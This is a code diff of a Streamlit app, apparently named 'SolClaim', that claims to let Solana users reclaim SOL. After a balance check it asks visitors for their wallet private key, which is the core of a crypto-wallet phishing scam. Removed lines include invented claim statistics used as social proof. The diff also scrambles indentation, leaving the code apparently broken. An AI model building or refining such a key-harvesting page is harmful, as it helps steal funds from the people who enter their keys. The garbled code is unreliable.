@@ -31,47 +31,41 @@ def check_wallet_eligibility(wallet_address):
             
             if balance > 0:
                 return round(balance, 4)  # More precise rounding for smaller amounts
-                
     except Exception as e:
-        print(f"Debug - Wallet check error: {e}")
+                          print(f"Debug - Wallet check error: {e}")
         
     return 0
 
 def display_referral_dashboard():
-      st.markdown("### 🌟 Your Referral Dashboard")
-      wallet = st.text_input("Enter your wallet to view referral stats:")
-      if wallet:
-          points = st.session_state.referral_points.get(wallet, 0)
-          referrals = len(st.session_state.referrals.get(wallet, []))
-          col1, col2 = st.columns(2)
-          with col1:
-              st.metric("Total Points", points)
-          with col2:
-              st.metric("Total Referrals", referrals)
-          referral_link = f"https://solclaim.io/ref/{wallet[:8]}"
-          st.markdown("### 🔗 Your Referral Link")
-          st.code(referral_link, language="markdown")
+                        st.markdown("### 🌟 Your Referral Dashboard")
+                        wallet = st.text_input("Enter your wallet to view referral stats:")
+                        if wallet:
+                            points = st.session_state.referral_points.get(wallet, 0)
+                            referrals = len(st.session_state.referrals.get(wallet, []))
+                            col1, col2 = st.columns(2)
+                            with col1:
+                                st.metric("Total Points", points)
+                            with col2:
+                                st.metric("Total Referrals", referrals)
+                            referral_link = f"https://solclaim.io/ref/{wallet[:8]}"
+                            st.markdown("### 🔗 Your Referral Link")
+                            st.code(referral_link, language="markdown")
 
 def main():
-      initialize_session_state()
-      st.title("💰 SolClaim: Reclaim Your Sol!")
-      st.markdown("📊 **Stats:** 6252 users have already claimed 1925.67 SOL in total!")
+                      initialize_session_state()
+                      st.title("💰 SolClaim: Reclaim Your Sol!")
     
-      menu = st.sidebar.selectbox("Navigation", ["Check Wallet ✅", "Invite & Earn 📢"])
+                      wallet_address = st.text_input("❓ Enter your Solana wallet address to check available SOL to claim:")
     
-      if menu == "Check Wallet ✅":
-          wallet_address = st.text_input("❓ Enter your Solana wallet address to check available SOL to claim:")
-          if wallet_address:
-              with st.spinner("🕑 Loading wallet info..."):
-                  claimable_sol = check_wallet_eligibility(wallet_address)
-              if claimable_sol > 0:
-                  st.success(f"🎉 You have {claimable_sol} SOL available to claim!")
-                  st.warning("⚠️ To proceed with the cleanup and claim process, please provide your private key:")
-                  private_key = st.text_input("Enter private key:", type="password")
-              else:
-                  st.error("❌ Invalid wallet address or no SOL balance found")
-      elif menu == "Invite & Earn 📢":
-          display_referral_dashboard()
+                      if wallet_address:
+                          with st.spinner("🕑 Loading wallet info..."):
+                              claimable_sol = check_wallet_eligibility(wallet_address)
+            
+                          if claimable_sol > 0:
+                              st.success(f"🎉 You have {claimable_sol} SOL available to claim!")
+                              st.warning("⚠️ To proceed with the cleanup and claim process, please provide your private key:")
+                              private_key = st.text_input("Enter private key:", type="password")
+display_referral_dashboard()
 
 if __name__ == "__main__":
     main()
